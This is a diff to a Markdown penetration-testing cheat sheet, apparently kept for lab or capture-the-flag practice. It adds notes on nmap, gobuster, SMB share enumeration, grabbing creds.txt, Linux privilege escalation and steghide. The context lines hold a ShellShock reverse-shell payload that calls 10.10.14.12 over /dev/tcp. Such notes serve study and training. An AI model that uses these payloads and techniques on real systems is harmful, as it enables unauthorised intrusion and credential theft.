@@ -10,17 +10,28 @@
 	- [Searchsploit](#searchsploit)
 	- [DNS + etc/hosts](#dns--etchosts)
 		- [Zone Transfer](#zone-transfer)
+	- [Nmap Automator](#nmap-automator)
 - [Web Enumeration](#web-enumeration)
+	- [Enumerate Directories](#enumerate-directories)
+	- [Identify Software in Use](#identify-software-in-use)
+- [Port Enumeration](#port-enumeration)
+	- [Port 53 - DNS](#port-53---dns)
+	- [Port 139 & 445 - SMB](#port-139--445---smb)
 - [Login Brute Forcing](#login-brute-forcing)
 - [Reverse Shells](#reverse-shells)
 	- [Upgrading Shells](#upgrading-shells)
 - [Privilege Escalation](#privilege-escalation)
-	- [sudo -l](#sudo--l)
-	- [LinEnum](#linenum)
-		- [Crontab](#crontab)
+	- [Linux](#linux)
+		- [sudo -l](#sudo--l)
+		- [LinEnum](#linenum)
+			- [Crontab](#crontab)
+		- [pspy](#pspy)
 - [File Transfer](#file-transfer)
 - [Other Vulnerabilities](#other-vulnerabilities)
 	- [ShellShock](#shellshock)
+	- [Hijack Module/File Used by Script](#hijack-modulefile-used-by-script)
+	- [Stenography Challenge](#stenography-challenge)
+	- [SUID - SystemCtl](#suid---systemctl)
 - [Miscellaneous](#miscellaneous)
 	- [Python SSL Issue](#python-ssl-issue)
 
@@ -64,6 +75,11 @@ nmap -sU -O -oA nmap/udp <IP>
 nmap --script vuln <IP>
 ```
 
+* Run the script vuln scanner on specific ports:
+
+```
+nmap -p 6697,8067,65534 --script irc-unrealircd-backdoor <IP>
+```
 
 <br>
 
@@ -84,6 +100,7 @@ nmap --script vuln <IP>
 
 <br>
 
+
 #### Searchsploit
 
 * This tool can be used to determine if the software is associated with any vulnerabilities.
@@ -91,7 +108,7 @@ nmap --script vuln <IP>
 * Example, the application is using an off the shelf software called Elastix:
 
 ```
-searchsploit elastix
+searchsploit elastix | grep 4\\.8\\.
 ```
 
 * Transfer the exploit to attacker machine:
@@ -125,6 +142,13 @@ nslookup <IP>
 host -l <domain-name> <dns_server-address>
 ```
 
+<br>
+
+#### Nmap Automator
+
+* Link - https://github.com/21y4d/nmapAutomator
+
+
 <br><br>
 
 
@@ -132,7 +156,10 @@ host -l <domain-name> <dns_server-address>
 
 * Begin by enumerating the web application or port 80/443 first to identify any foot holds.
 
-* Enumerate directories:
+
+<br>
+
+#### Enumerate Directories
 
 ```
 gobuster dir -t 10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u <IP>
@@ -140,6 +167,59 @@ gobuster dir -t 10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.t
 
 ```
 ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ
+```
+
+<br>
+
+#### Identify Software in Use
+
+* Identify software that is being used by the application and then use "searchsploit" to check if it contains any vulnerabilities, for example
+
+
+
+<br><br>
+
+
+### Port Enumeration
+
+
+#### Port 53 - DNS
+
+* When this port is open we can get the domain name through nslookup and attempt a zone transfer to enumerate name servers, hostnames, etc.
+
+
+#### Port 139 & 445 - SMB
+
+* Run smbmap to list available shares and permissions.
+
+```
+smbmap -H <IP>
+```
+
+* List the content of the shares.
+
+```
+smbmap -R -H <IP>
+```
+
+<br>
+
+* Use smbclient to view more information about the shares.
+
+```
+smbclient -L //<IP>
+```
+
+* Login anonymously (without a password) into the general share.
+
+```
+smbclient //<IP>/general -N
+```
+
+* Download the creds.txt file from the target machine to the attack machine.
+
+```
+get creds.txt
 ```
 
 
@@ -208,7 +288,14 @@ export TERM=xterm
 
 <br>
 
-#### sudo -l
+#### Linux
+
+
+<br>
+
+
+##### sudo -l
+
 * Following command lists the allowed commands for my user:
 
 ```
@@ -223,18 +310,30 @@ sudo -i -u <user name>
 
 <br>
 
-#### LinEnum
+
+##### LinEnum
 
 * https://github.com/rebootuser/LinEnum
 
+* Download script to victim machine using Python Simple Server and Wget, then give it execution permissions and run it
+
+
 <br>
 
-##### Crontab
+###### Crontab
 
 * https://tigr.net/3203/2014/09/13/getting-wordpress-cron-work-in-multisite-environment/
 
 * This section of the LinEnum tool will show what files are being run as a cron job, if there are any files where we can write into, and are executed as root, we can gain a reverse shell as root by modifying the file
 
+
+<br>
+
+
+##### pspy
+
+
+ * Link - https://github.com/DominicBreuker/pspy
 
 
 <br><br>
@@ -269,9 +368,44 @@ wget http://10.10.14.30:9005/test.py
 () { :;}; bash -i >& /dev/tcp/10.10.14.12/4444 0>&1
 ```
 
+<br>
+
+
+#### Hijack Module/File Used by Script
+
+* If you identify a script that is running a library/file, identify if you have write access to the file, then you can upload a reverse shell in there for example
+
+
+<br>
+
+#### Stenography Challenge
+
+```
+apt-get install steghide
+```
+
+```
+steghide extract -sf <JPG Image File Name>
+```
+
+
+<br>
+
+
+#### SUID - SystemCtl
+
+
+* Link - https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49
+
+
+
 <br><br>
 
+
 ### Miscellaneous
+
+
+<br>
 
 #### Python SSL Issue
 
